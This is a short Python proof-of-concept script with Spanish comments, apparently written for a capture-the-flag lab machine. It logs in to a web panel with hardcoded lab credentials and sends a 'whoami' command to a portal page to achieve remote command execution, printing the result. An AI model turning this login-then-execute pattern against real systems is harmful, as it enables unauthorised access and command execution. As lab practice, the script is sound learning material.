import requests as re

# Se inicia la variable sesion para guardar las cookies
sesion = re.Session()

# Defino las constantes del PoC de requests + session
LOGIN_ENDPOINT = 'http://10.128.167.86/login.php'
CREDENCIALES = {
	'username' : 'R1ckRul3s',
	'password' : 'Wubbalubbadubdub',
	'sub' : 'Login'
}

# Defino el ednpoint y el payload necesarios para RCE
RCE_ENDPOINT = 'http://10.128.167.86/portal.php'
PAYLOAD = {
        'command' : 'whoami',
        'sub': 'Execute'
}

# Ahora hay que acceder con el metodo POST (Endpoint + credenciales)
estado_login = sesion.post(LOGIN_ENDPOINT,data = CREDENCIALES)

# Se anaden las siguientes comprobaciones para verificar el resultado
if estado_login.status_code == 200:
	print('Peticion de login enviada. Verificando...')
	if 'Command Panel' in estado_login.text:
		print('Login exitoso! Mostrando las cookies de sesion:')
		print(sesion.cookies)
# Ahora tras un intento exitoso se va a probar a realizar RCE con POST y el Endpoint ()
		rce_respuesta = sesion.post(RCE_ENDPOINT, data = PAYLOAD)
		if rce_respuesta.status_code == 200:
			print('El comando se ha ejecutado satisfactoriamente. Resultado:')
			print(rce_respuesta.text)
		else:
			print('Ha habido un error')
	else:
		print('Login fallido!')
else:
        print('Error de conexion!')

